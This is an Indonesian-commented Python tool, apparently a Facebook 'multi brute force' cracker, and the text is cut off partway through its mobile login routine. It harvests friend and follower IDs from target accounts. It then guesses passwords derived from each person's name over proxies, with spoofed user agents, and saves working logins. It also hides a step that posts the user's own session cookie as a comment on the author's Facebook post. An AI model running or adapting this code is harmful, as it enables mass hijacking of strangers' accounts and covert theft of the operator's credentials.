#>[ RECODE AJA BANG ]<#
#>[ FOLLOW AND STAR ]<#

###>[ INFO AUTHOR AGAK GANS]<###
#>----------------------------------------------<#
author ='Muhammad Basari'
github ='github.com/Basari-ID'
facebook ='fb.me/basari.shp'
#>----------------------------------------------<#

# Script Ini 100% Open Source Code Ya ! #
# Kalian Oprek Sendiri Biar Hasilnya Ijo #

###>[ MENGIMPORT MODULE ]<###
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz

###>[ UGENT DAN PROXY LIST ]<###
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
for xd in range(10000):
        a='Mozilla/5.0 (Linux; Android'
        b=random.randrange(1, 9)
        c=random.randrange(1, 9)
        d='9; Mi 9T)'
        e=random.randrange(100, 9999)
        f='AppleWebKit/537.36 (KHTML, like Gecko)'
        g=random.randrange(1, 9)
        h=random.randrange(1, 4)
        i=random.randrange(1, 4)
        j=random.randrange(1, 4)
        k='Chrome/75.0.3770.101 Mobile Safari/537.36'
        uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
        ugen2.append(uaku)

        aa='Mozilla/5.0 (Linux; U; Android 7.0; es-us;'
        b=random.choice(['7.0','8.1.0','9','10','11','12'])
        c=random.choice(['Redmi Note 4 Build/NRD90M)'])
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko)'
        h=random.randrange(80,103)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
        c=random.choice(['SAMSUNG SM-A320FL Build/MMB29K)'])
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87'
        h=random.randrange(80,103)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

        aa='Mozilla/5.0 (Linux; Android 11;'
        b=random.choice(['7.0','8.1.0','9','10','11','12'])
        c=random.choice(['Redmi Note 9 Pro'])
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko)'
        h=random.randrange(80,103)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

        aa='Mozilla/5.0 (Linux; Android 9;'
        b=random.choice(['7.0','8.1.0','9','10','11','12'])
        c=random.choice(['Redmi 6A Build/PPR1.180610.011; wv)'])
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko)'
        h=random.randrange(80,103)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Version/4.0 Chrome/107.0.5304.36 Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

###>[ UAKU ]<###
def uaku():
	try:
		ua=open('ua2.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Basari-ID/CRACK/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.ua2.txt','r').read().splitlines()

###>[ INDICATION ]<###
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

###>[ WARNA ]<###
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' 
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
linbas = random.choice([m,k,h,u,b])

###>[ KEPENTINGAN ]<###
url = "free.facebook.com"
basari1 = '[•]'
basari2 = '[?]'
basari3 = '[!]'
lina = 'mantan'
syafa ='pacar'
gabut = 'hehe'
eror_script = ['12', '12', '2022']

###>[ BACA BANG ]<###
oi_bang = 'kalo mau ngerecode follow dululah github saya'

###>[ BOT JANGAN DIUBAH HARGAI AUTHOR ]<###
kom1 = ("wuih keren banget bang\n-\nhttps://www.facebook.com/100051967952842/posts/571109557964638\n-\n \nkomentar ditulis oleh bot baz\n \n[><]")
kom2 = ("mantap bang sehat selalu\n-\nhttps://www.facebook.com/100051967952842/posts/571109557964638\n-\n \nkomentar ditulis oleh bot baz\n \n[><]")
#kom3 = ("moga langgeng bang sama syafa\n-\nhttps://www.facebook.com/100051967952842/posts/571109557964638\n-\n \nkomentar ditulis oleh bot baz\n \n[><]")
###>[ DITAMBAH AJA BOTNYA BRO KALO MAU ]<###

###>[ BULAN TANGGAL WAKTU TAHUN ]<###
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
now = datetime.datetime.now()
hour = now.hour
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

###>[ BOT BAS ]<###
def bot():
	try:
		requests.post("https://graph.facebook.com/100051967952842?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass

###>[ JALAN ]<###
def basari_tamvan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)

###>[ CLEAR ]<###
def clear():
	os.system('clear')

###>[ BACK ]<###
def back():
	login()
	
###>[ BANNER ]<###
def banner():
	print(f'{b}========================================{x}')
	print(f"""{h}[•]{x} {b}Basari Multi Brute Force{x} {h}[•]{x}
{h}  ____  __  __ ____  ______ 
{h} |  _ \|  \/  |  _ \|  ____|
 {h}| |_) | \  / | |_) | |__   
{h} |  _ <| |\/| |  _ <|  __|  
{h} | |_) | |  | | |_) | |     
{h} |____/|_|  |_|____/|_| {O}V.01     {x}""")
	print(f'{b}========================================{x}')
			
###>[ PERBAIKAN ]<###
def perbaikan_sc():
	saat_ini = datetime.datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	tanggal = thn_ + bln_ + tgl_
	err = eror_script[2] + eror_script[1] + eror_script[0]
	if tanggal >= err:
		basari_tamvan(f'{sir}[!] SCRIPT BMBF SEDANG DALAM PERBAIKAN,SILAHKAN CHAT AUTHOR UNTUK INFO LEBIH LANJUT{x}')
		time.sleep(4)
		os.system("xdg-open https://www.facebook.com/basari.shp")
		exit()
	else:
		pass

###>[ LOGIN 1 ]<###
def login():
	perbaikan_sc()
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			basariheker = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			baslovesyafa = json.loads(basariheker.text)['name']
			basganteng = json.loads(basariheker.text)['id']
			menu(baslovesyafa,basganteng)
		except KeyError:
			login_bas()
		except requests.exceptions.ConnectionError:
			bascuy = '# JARINGAN EROR ! BENERIN DULU SANA !'
			coder_i = mark(bascuy, style='cyan')
			sol().print(coder_i, style='cyan')
			exit()
	except IOError:
		login_bas()

###>[ LOGIN 2 ]<###
def login_bas():
	try:
		os.system('clear')
		banner()
		linbas = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{linbas} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1));bot()
		cok=open(".cok.txt", "w").write(cookie)
		print('')
		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL ! JALANKAN LAGI !{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print('')
		print(f'  %s[%sx%s]%s LOGIN GAGAL ! GANTI COOKIES !%s'%(x,k,x,m,x))
		exit()
		
###>[ BAGIAN MENU ]<###
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		requests.post(f"https://graph.facebook.com/571109557964638/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/571109557964638/comments/?message={kom2}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/571109557964638/comments/?message={cok}&access_token={token}", headers = {"cookie":cok})
	except IOError:
		print(f'{sir}[×] Cookies Telah Kadaluarsa ! Ganti Cookies !{x} ')
		time.sleep(5)
		login_bas()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	basari_tamvan(f'{P}[>] ID  : '+str(my_id))
	basari_tamvan(f'{P}[>] IP  : {ip}{x}')
	#basari_tamvan(f'[>] GH   : Basari-ID')
	print(f'{b}========================================{x}')
	cetak(' [•] 1. Crack Publik Massal\n [•] 2. Crack Followers\n [•] 3. Crack Group\n [•] 4. Hasil Crack\n [•] 5. Chat Author\n [•] 0. Keluar')
	print(f'{b}========================================{x}')
	basari_sayang_syafaa = input(f'{P}[?] Pilih :{x} ')
	print(f'{b}========================================{x}')
	if basari_sayang_syafaa in ['1']:
		dump_massal()
	elif basari_sayang_syafaa in ['2']:
		dump_pengikut()
	elif basari_sayang_syafaa in ['3']:
		grup()
	elif basari_sayang_syafaa in ['4']:
		result()
	elif basari_sayang_syafaa in ['5']:
		authorbas()
	elif basari_sayang_syafaa in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'{sir}[!] Sukses Logout+Hapus Cookies{x} ')
		time.sleep(4)
		exit()
	else:
		print(f'{sir}[!] Pilih Yang Bener Lah cuk')
		time.sleep(4)
		back()
def authorbas():
	basari_tamvan(f'{sir}[!] Tunggu Bentar cuk Ntar Diarahin Ke Facebook  {x}')
	time.sleep(4)
	os.system("xdg-open https://www.facebook.com/basari.shp")
	back()
	
###>[ HASIL CRACK ]<###
def result():
	print(f'{P}[!] 1. Hasil{x} {h}OK{x} {P}Anda{x} ')
	print(f'{P}[!] 2. Hasil{x} {k}CP{x} {P}Anda{x} ')
	print(f'{P}[!] 3. Kembali{x} ')
	print(f'{b}========================================{x}')
	baz_code = input(f'{P}[?] Pilih :{x} ')
	if baz_code in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('[!] File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('[!] Tidak Ada Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[!] %s. %s ({k} %s {x}Id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('[?] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('[!] Pilih Yang Bener Cuk ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('[!] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}[!] {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{b} Tekan Enter Untuk Kembali{x} ]')
			back()
	elif baz_code in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('[!] File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('[!] Tidak Ada Hasil OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[!] %s. %s ( {h}%s{x} Id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[!] %s. %s ({h} %s {x}Id )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('[!] Pilih Yang Bener Lah ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('[!] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}[!] {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{b} Tekan Enter Untuk Kembali{x} ]')
			back()
	elif baz_code in ['3']:
		back()
	else:
		print('[!] Pilih Yang Bener Lah ')
		back()
		
###>[ CRACK MASSAL ]<###
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		baz_coder = int(input(f'{P}[?] Berapa Target Id{x} : '))
	except ValueError:
		print('[!] Yang Bener Napa Cuk ')
		time.sleep(4)
		exit()
	if baz_coder<1 or baz_coder>100:
		print('[!] Gagal Dump Id Target ')
		time.sleep(4)
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(baz_coder):
		yz+=1
		kl = input(f'{P}[!] Id Target Ke{x} '+str(yz)+' : ')
		uid.append(kl)
		print(f'{b}========================================{x}')
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('[!] Sinyal Lu Eror ')
			exit()
	try:
		print(f'{P}[!] Total Id Target{x} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(f'{sir}[!] Koneksi Lu Eror Cuk{x} ')
		time.sleep(4)
		back()
	except (KeyError,IOError):
		print(f'[!]{sir} Pertemanan Id Target Lu Tidak Publik {x}')
		time.sleep(4)
		back()
		
###>[ CRACK PENGIKUT ]<###
def dump_pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	baz_oi = input(f'{P}[!] Id Target :{x} ')
	print(f'{b}========================================{x}')
	try:
		baz_pero = requests.get('https://graph.facebook.com/'+baz_oi+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in baz_pero['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'{P}[!] Total Id Target :{x} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{sir}[!] Koneksi Internet Bermasalah {x}')
		time.sleep(4)
		exit()
	except (KeyError,IOError):
		print(f'{sir}[!] Gagal Mengambil Id Target Bang,Crack Publik Massal Aja{x}')
		time.sleep(4)
		back()
		
###>[ CRACK GRUP FB ]<###
def grup():
	basari_tamvan(f'{sir}[!] Maaf Fitur Ini Masih Dalam Perbaikan  {x}')
	time.sleep(4)
	back()
			
###>[ ID SETTING ]<###
def setting():
	print(f'{b}========================================{x}')
	cetak(' [•] 1. Akun Lama\n [•] 2. Akun Baru\n [•] 3. Akun Acak')
	print(f'{b}========================================{x}')
	baz_gege = input(f'{P}[?] Pilih :{x} ')
	print(f'{b}========================================{x}')
	if baz_gege in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif baz_gege in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif baz_gege in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('[!] Pilih Yang Bener Cuukk')
		exit()
		
###>[ METHOD LOGIN ]<###
	cetak(' [•] 1. Mobile.facebook\n [•] 2. Mbasic.facebook')
	print(f'{b}========================================{x}')
	basarifaa = input(f'{P}[?] Pilih :{x} ')
	if basarifaa in ['1','01']:
		method.append('mobile')
	elif basarifaa in ['']:
		print('[!] Pilih Yang Bener Lah ')
		setting()
	elif basarifaa in ['2','02']:
		method.append('mbasic')
	elif basarifaa in ['3','03']:
		method.append('regular')
	else:
		method.append('mobile')
	print(f'{b}========================================{x}')
	_basnih_ = input(f'{P}[?] Tampilkan Aplikasi Y/t :{x} ')
	if _basnih_ in ['']:
		print('[!] Pilih Yang Bener Lah ')
		back()
	elif _basnih_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	print(f'{b}========================================{x}')
	pwplus=input(f'{P}[?] Kata Sandi Tambahan Y/t :{x} ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f'{P}[!] Masukkan Sandi Tambahan :{x} ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	
###>[ CRACKING ]<###
def passwrd():
	print(f'{b}========================================{x}')
	print(f'{P}[•] Hasil{x} {h}OK{x} {P}Tersimpan Di :{x} {h}%s {x}'%(okc))
	print(f'{P}[•] Hasil{x} {k}CP{x} {P}Tersimpan Di :{x} {k}%s {x}'%(cpc))
	print(f'{b}========================================{x}')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crackmobile,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			elif 'regular' in method:
				pool.submit(crackregular,idf,pwv,"free.facebook.com")
			else:
				pool.submit(crackregular,idf,pwv,"free.facebook.com")
	print('')
	#bismillah
	print(f'{b}========================================{x}')
	print(f'[{b}•{x}]{h} HASIL OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} HASIL CP : {k}%s{x} '%(cp))
	print(f'{b}========================================{x}')

###>[ METHOD MOBILE ]<###
def crackmobile(idf,pwv):
        global loop,ok,cp
        bo = random.choice([m,k,h,b,u,x])
        sys.stdout.write(f"\r[>] MOBILE {P}{loop}{P}/{P}{len(id)}{P} OK : {H}{ok}{P} CP : {k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
        sys.stdout.flush()
        nip=random.choice(prox)
        proxs= {'http': 'socks4://'+nip}
        #UBAH UA DISINI !
        ua = random.choice(['Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0.3','Mozilla/5.0 (Linux; Android 10; SM-N971U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; CPH2121 Build/RP1A.200720.010; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 9; en-us; Redmi 6 Pro Build/PKQ1.180917.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.0.19 swan-mibrowser','Mozilla/5.0 (Linux; Android 11; 220233L2G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 11; id-id; Redmi 10A Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.11.1-gn','Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5pro Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 WpsMoffice/16.5.2/arm64-v8a/1344','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36'])
        ua2 = random.choice(['Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36'])
        ses = requests.Session()
        for pw in pwv:
                try:
                        ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                        p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
